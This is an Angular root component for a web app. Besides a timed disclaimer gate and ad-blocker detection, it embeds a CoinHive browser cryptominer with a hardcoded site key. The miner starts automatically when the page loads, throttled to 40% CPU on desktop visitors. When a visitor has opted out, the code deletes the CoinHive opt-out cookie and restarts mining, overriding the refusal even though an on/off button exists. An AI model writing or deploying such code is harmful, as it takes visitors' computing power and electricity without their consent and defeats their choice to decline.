import { Component, OnInit } from '@angular/core';

import { SimpleTimer } from 'ng2-simple-timer';
import { CookieService } from 'ngx-cookie-service';

declare var CoinHive: any;
declare var FuckAdBlock: any;

@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.css']
})
export class AppComponent implements OnInit {

	private timer: number = 0;
	private timerName: string = 'DisclaimerDuration';
  private cm: any;
  private fuckAdBlock: any;

  public miner: any;
  public adBlockEnabled: boolean = false;
	public appVisible: boolean = false;
  public minerBtnText: string;

	constructor(private st: SimpleTimer, private cookie: CookieService) { }

	ngOnInit() {
		this.st.newTimer(this.timerName, 1);
		this.st.subscribe(this.timerName, () => this.timer++);
    try {
      this.fuckAdBlock = new FuckAdBlock({
        checkOnLoad: true
      });
      this.fuckAdBlock.onDetected(() => this.adBlockDetected())
      this.fuckAdBlock.onNotDetected(() => this.adBlockNotDetected())
      this.miner = new CoinHive.Anonymous('6lHLt4JATg9Qu7k3fn5LoSRxGGR1qUpn', {throttle: 0.4});

      this.miner.on('optin', (params) => {
        if (params.status === 'accepted') {
          this.minerBtnText = "Thank You!"
          setTimeout(() => this.minerBtnText = "Turn miner off.", 500)
        } else {
          this.minerBtnText = ":("
          setTimeout(() => this.minerBtnText = "Turn miner on.", 500)
        }
      });

      this.toggleMiner();
    } catch (e) {
      this.adBlockDetected()
    }
	}

  private adBlockDetected() {
    this.adBlockEnabled = true;
  }

  private adBlockNotDetected() {
    this.adBlockEnabled = false;
  }

  private startMiner() {
    if (!this.miner.isMobile() && !this.miner.didOptOut(14400)) {
        this.miner.start();
        this.toggleMinerBtnText();
    }
  }

  private stopMiner() {
    this.miner.stop();
    this.toggleMinerBtnText();
  }

  showApp() {
  	if (this.timer < 20 && !this.cookie.check('disclaimerPassed')) {
  		window.alert("WOW! How did you read everything in just " + this.timer + " seconds?! IMPRESSIVE!\nPlease read the entire disclaimer.")
    } else {
  		this.appVisible = true;
  		this.st.delTimer(this.timerName);
      this.cookie.set('disclaimerPassed', 'true');
  	}
  }

  minerAvail(): boolean {
    return (typeof this.miner !== 'undefined')
  }

  minerBtnClass(): string {
    if (this.miner.isRunning()) {
      return "btn btn-danger"
    } else {
      return "btn btn-success"
    }
  }

  toggleMiner() {
    if (this.miner.isRunning()) {
      this.stopMiner();
    } else {
      this.startMiner()
      if (!this.miner.isRunning()) {
        this.cookie.delete('CoinHiveOptOut');
        this.startMiner();
      }
    }
  }

  toggleMinerBtnText() {
    if (!this.miner.isRunning()) {
      this.minerBtnText = ":("
      setTimeout(() => this.minerBtnText = "Turn miner on.", 500)
    } else {
      this.minerBtnText = "Thank You!"
      setTimeout(() => this.minerBtnText = "Turn miner off.", 500)
    }
  }

  minerStatus(): string {
    if (this.miner.isRunning()) {
      return "ON"
    } else {
      return "OFF"
    }
  }

  minerStatusGA(): string {
    if (!this.miner.isRunning()) {
      return "on"
    } else {
      return "off"
    }
  }

  minerStatusColor(): string {
    if (this.miner.isRunning()) {
      return "green"
    } else {
      return "red"
    }
  }
}
